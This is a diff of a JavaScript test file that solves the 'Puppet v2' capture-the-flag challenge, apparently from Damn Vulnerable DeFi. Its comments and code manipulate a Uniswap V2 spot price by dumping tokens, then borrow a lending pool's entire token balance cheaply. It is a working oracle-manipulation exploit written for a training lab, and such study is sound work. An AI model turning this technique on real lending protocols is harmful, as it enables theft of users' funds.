@@ -86,66 +86,61 @@ describe('[Challenge] Puppet v2', function () {
 	})
 
 	/*  
-		At first the quote() function of the UniswapV2Library returns the correct 
-		stipulated value:
+		The UniswapV2 protocol uses the following math for calculating the cost of an
+		asset in a pair contract:
 
-			amountB = amount * reserveWETH / reserveDVT;
+			costForAllDVTInPool = ( reserveWETH / reserveDVT ) * amountToBorrow
+			costForAllDVTInPool =  ( 10e18 / 100e18 ) * 1.000.000 = 100.000e18
+			requiredWETH = costForAllDVTInPool * 3 = 300.000 WETH
 
-			valueDVT = 1.000.000 *  10 / 100= 100.000
-			requiredWETH = valueDVT * 3 = 300.000
-
-		But, if we reduce the WETH balance and increase the DVT balance of UniswapExchange
-		by sending the 10,000 DVT we own as the attacker, it will imbalance the ratio and thus 
-		reduce significantly the value of the DVT: 
-
-			newValueDVT = 1.000.000 * ~9.9 / 10.100 = ~980.2
-			newRequiredWETH = ~980.2 * 3 =  ~29.4
+		If we use the attacker's DVT tokens (10,000) and swap them for WETH using the Uniswap
+		pair contract, it will increase the amount of DVT (from 100 to 10.100) and decrease the 
+		amount of WETH (from 10 to 0,0993...).
+		This will affect the ratio between them significantly and change the cost of the DVT, also
+		significantly: 
+		
+			newCostForAllDVTInPool = ( reserveWETH / reserveDVT ) * amountToBorrow
+			newCostForAllDVTInPool =  ( 0,0993... / 10.100e18 ) * 1.000.000 = 9.8321...
+			newRequiredWETH = costForAllDVTInPool * 3 = 29,4964... WETH
 	*/
 	it('Exploit', async function () {
 		/** CODE YOUR EXPLOIT HERE */
-
 		console.log(
-			'WETH REQUIRED BEFORE: ',
+			'WETH REQUIRED BEFORE SWAP: ',
 			String(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE))
 		)
 
-		// Swap most of attacker's ETH balance to WETH, leaving some ETH for gas fees
-		const ethToWETHAmount = ethers.utils.parseEther('19.9')
-		await this.weth.connect(attacker).deposit({value: ethToWETHAmount})
-
-		// Approve all attacker's DVT balance to UniswapRouter contract
+		// Approve all attacker's DVT balance to UniswapRouter contract.
 		await this.token
 			.connect(attacker)
 			.approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
 
-		// Swap all DVT tokens to WETH using the UniswapRouter contract.
-		// This will devaluate the DVT/WETH ratio enormously due to the amount of DVT
-		// owned and swapped by the attacker
+		// Swap all DVT tokens with WETH using the UniswapRouter contract.
 		await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
 			ATTACKER_INITIAL_TOKEN_BALANCE, // amountIn
 			0, // amountOutMin
 			[this.token.address, this.weth.address], // [tokenFromUserToPool, tokenFromPoolToUser]
 			attacker.address, // to
-			(await ethers.provider.getBlock('latest')).timestamp * 2 // deadline
+			(await ethers.provider.getBlock('latest')).timestamp * 2 // arbitrary deadline
 		)
 
-		console.log(
-			'WETH REQUIRED BEFORE: ',
-			String(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE))
-		)
+		// Get the extra WETH needed by interacting with WETH9 contract
+		await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('19.6')})
 
-		// // The attacker now has enough WETH (~29.8) to borrow all DVT from pool (~29.5)
-		// const wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(
-		// 	POOL_INITIAL_TOKEN_BALANCE
-		// )
-		// await this.weth.connect(attacker).approve(this.lendingPool.address, wethRequired)
-		// await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
+		// Borrow all DVT tokens from pool (~29.5 WETH)
+		const wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(
+			POOL_INITIAL_TOKEN_BALANCE
+		)
+		await this.weth.connect(attacker).approve(this.lendingPool.address, wethRequired)
+		await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
+
+		console.log('WETH REQUIRED AFTER SWAP: ', String(wethRequired))
 	})
 
 	after(async function () {
 		/** SUCCESS CONDITIONS */
 		// Attacker has taken all tokens from the pool
-		// expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq('0')
-		// expect(await this.token.balanceOf(attacker.address)).to.be.gte(POOL_INITIAL_TOKEN_BALANCE)
+		expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq('0')
+		expect(await this.token.balanceOf(attacker.address)).to.be.gte(POOL_INITIAL_TOKEN_BALANCE)
 	})
 })
